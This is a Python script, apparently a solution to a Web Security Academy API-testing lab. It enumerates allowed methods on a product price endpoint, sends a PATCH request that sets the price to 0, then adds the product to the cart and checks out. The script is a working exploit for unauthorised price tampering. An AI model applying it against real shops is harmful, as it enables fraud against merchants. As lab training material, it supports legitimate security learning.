import requests

requests.packages.urllib3.disable_warnings()


'''

Coded by Kamran Saifullah
https://linkedin.com/in/KamranSaifullah
https://twitter.com/deFr0ggy
https://github.com/deFr0ggy

'''

proxxy = {

    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080"

}

data = {}

URL = "https://0a1a00ec04ed1f3180408f0600be00c2.web-security-academy.net"

API_Price_Endpoint = "/api/products/1/price"

headers = {

                            "Cookie" : "session=95W14JsKlhMJW0cCHXyjRxv6PLlrKNhw",
                            "Content-Type" : "application/json"
                           
                        }

headers1 = {

                            "Cookie" : "session=95W14JsKlhMJW0cCHXyjRxv6PLlrKNhw"
                           
                        }

r = requests.get(URL, verify=False)

try:
    if r.status_code == 200:

        print(f"[+] URL is accessible with Default POST Data: {URL}")

        r = requests.get(URL+API_Price_Endpoint, verify=False)
        print(r)
        if r.status_code == 200:
            print(f"[+] API Price URL Accessible: {URL+API_Price_Endpoint}")
            print("[+] Testing OPTIONS Method")
            
            r = requests.options(URL+API_Price_Endpoint, verify=False)

            if r.status_code == 405: 
                print("[+] Options Method Worked and Method Allowed Are As Below")
                
                print(r.headers["Allow"].split(","))

                allowedHeaders = [method.strip() for method in r.headers['Allow'].split(',')]

                for head in allowedHeaders:
                    r = requests.request(head, URL+API_Price_Endpoint)
                    if r.status_code == 401:
                        print(f"[+] Exploiting PATCH Method to make Price 0")
                        

                        json_data = {

                            "price": 0

                        }

                        r = requests.request(head, URL + API_Price_Endpoint, headers=headers, json=json_data)
                        
                        if r.status_code == 200: 
                            print("[+] The price has been set to $0")
                            print("[+] Adding Item To Cart")

                            cart = "productId=1&redir=PRODUCT&quantity=1"

                            r = requests.post(URL+"/cart", data=cart, headers=headers1, proxies=proxxy, verify=False)
                            
                            if r.status_code == 200:


                                data = "csrf=d2OA5e0lKiA3FaeDejv5EsSW8gxKypi0"

                                r = requests.post(URL+"/cart/checkout", headers=headers1, data=data, verify=False, proxies=proxxy, allow_redirects=True)

                                print(r)

                                if "Congratulations" in r.text:
                                    print("[-] Lab has been solved!")
                        else:
                            print("Something went wrong!")

except:
    print("Something went wrong!")

